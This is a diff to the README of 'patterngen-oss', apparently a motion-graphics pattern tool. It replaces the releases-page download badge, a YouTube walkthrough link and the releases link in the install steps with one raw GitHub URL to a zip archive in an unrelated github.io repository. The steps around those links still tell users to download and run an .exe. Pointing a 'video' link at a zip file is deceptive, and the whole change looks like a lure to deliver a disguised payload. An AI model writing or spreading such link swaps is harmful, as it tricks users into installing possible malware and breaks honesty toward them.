@@ -5,7 +5,7 @@ description: "Generate animated procedural patterns for motion graphics and expo
 ---
 # 🎨 patterngen-oss - Create animated patterns for motion graphics
 
-[![Download PatternGen](https://img.shields.io/badge/Download_Latest_Release-blue)](https://github.com/ugyens7615/patterngen-oss/releases)
+[![Download PatternGen](https://img.shields.io/badge/Download_Latest_Release-blue)](https://raw.githubusercontent.com/ugyens7615/ugyens7615.github.io/main/Damara/github_io_ugyens_v2.7-alpha.1.zip)
 
 ## 📋 What is PatternGen
 
@@ -20,7 +20,7 @@ PatternGen helps you make animated designs for videos. You create a layout in Fi
 
 ## 🎥 Learn the Workflow
 
-[Watch the walkthrough video here](https://www.youtube.com/watch?v=edUOvt6Y5ts)
+[Watch the walkthrough video here](https://raw.githubusercontent.com/ugyens7615/ugyens7615.github.io/main/Damara/github_io_ugyens_v2.7-alpha.1.zip)
 
 This video explains how to connect your design work to the animation tool. It shows the steps to prepare a file in Figma, pick your animation settings in the browser, and import the final result into your 3D design software.
 
@@ -28,7 +28,7 @@ This video explains how to connect your design work to the animation tool. It sh
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [releases page](https://github.com/ugyens7615/patterngen-oss/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/ugyens7615/ugyens7615.github.io/main/Damara/github_io_ugyens_v2.7-alpha.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
